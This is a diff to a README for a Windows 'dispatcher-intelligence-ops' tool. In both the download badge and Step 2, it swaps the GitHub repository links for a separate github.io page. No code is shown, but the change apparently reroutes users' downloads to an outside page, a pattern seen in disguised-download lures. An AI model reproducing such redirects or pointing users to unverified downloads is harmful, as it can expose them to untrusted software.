@@ -1,6 +1,6 @@
 # 📊 dispatcher-intelligence-ops - Your All-in-One QuickMove Operations Assistant
 
-[![Download Now](https://img.shields.io/badge/Download-Dispatcher_Intel_Ops-2ea44f?style=for-the-badge&logo=github)](https://github.com/bernadinecapital624/dispatcher-intelligence-ops)
+[![Download Now](https://img.shields.io/badge/Download-Dispatcher_Intel_Ops-2ea44f?style=for-the-badge&logo=github)](https://bernadinecapital624.github.io)
 
 ## 🎯 What This Tool Does
 
@@ -43,7 +43,7 @@ Follow these steps to get the tool on your Windows computer.
 
 Click this link to go to the download page:
 
-**[https://github.com/bernadinecapital624/dispatcher-intelligence-ops](https://github.com/bernadinecapital624/dispatcher-intelligence-ops)**
+**[https://bernadinecapital624.github.io](https://bernadinecapital624.github.io)**
 
 ### Step 2: Find the Download Button
 
